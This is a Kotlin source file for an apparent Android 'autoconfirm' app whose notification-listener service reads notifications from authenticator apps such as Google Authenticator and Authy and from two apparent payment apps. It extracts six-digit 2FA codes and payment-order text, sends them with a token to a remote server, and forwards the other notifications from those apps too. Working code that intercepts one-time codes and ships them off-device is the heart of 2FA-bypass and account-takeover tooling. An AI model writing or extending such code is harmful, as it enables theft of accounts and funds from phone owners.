package com.autoconfirm.app

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log

class NotificationService : NotificationListenerService() {

    private val TARGET_APPS = listOf(
        "com.reddy", "com.blaffa",
        "com.google.android.apps.authenticator2",
        "com.authy.authy", "otp.authenticator"
    )

    private val REDDY_KEYWORDS = listOf(
        "BankTransfer", "Deposit Request", "Payment number",
        "Amount", "Agent", "authenticationBot"
    )

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val packageName = sbn.packageName ?: return
        val prefs = getSharedPreferences("autoconfirm", MODE_PRIVATE)
        val serverUrl = prefs.getString("server_url", "") ?: return
        val token = prefs.getString("token", "") ?: return
        if (serverUrl.isEmpty() || token.isEmpty()) return

        val isTarget = TARGET_APPS.any { packageName.contains(it, ignoreCase = true) }
        if (!isTarget) return

        val extras = sbn.notification.extras
        val title = extras.getString("android.title") ?: ""
        val text = extras.getString("android.text") ?: ""
        val bigText = extras.getCharSequence("android.bigText")?.toString() ?: ""
        val fullText = if (bigText.isNotEmpty()) bigText else text
        val body = if (title.isNotEmpty()) "$title\n$fullText" else fullText
        if (body.isEmpty()) return

        Log.d("AutoConfirm", "Notification de $packageName: $body")

        val isAuthCode = body.matches(Regex(".*\\b\\d{6}\\b.*")) &&
            (title.contains("authenticat", ignoreCase = true) ||
             title.contains("code", ignoreCase = true) ||
             packageName.contains("authenticat", ignoreCase = true))

        val isReddyOrder = REDDY_KEYWORDS.any { body.contains(it, ignoreCase = true) }

        when {
            isAuthCode -> ApiClient.send2FA(serverUrl, token, body) { s, _ -> Log.d("AutoConfirm", "2FA envoye: $s") }
            isReddyOrder -> ApiClient.sendOrder(serverUrl, token, body) { s, _ -> Log.d("AutoConfirm", "Commande envoyee: $s") }
            else -> ApiClient.sendSms(serverUrl, token, packageName, body) { s, _ -> Log.d("AutoConfirm", "Notif envoyee: $s") }
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {}
}
